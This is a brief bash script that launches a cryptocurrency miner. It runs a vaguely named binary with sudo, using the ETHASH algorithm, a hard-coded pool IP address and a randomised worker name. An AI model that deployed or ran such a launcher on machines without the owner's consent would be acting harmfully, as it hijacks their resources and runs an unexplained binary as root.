#!/bin/bash
#!/bin/bash

POOL=128.199.157.196:14699
WALLET=AnhDuy-$(shuf -n 1 -i 1-9999)
cd "$(dirname "$0")"

chmod +x ./khongnamtrongsachvosx && sudo ./khongnamtrongsachvosx --algo ETHASH --pool $POOL --user $WALLET  $@
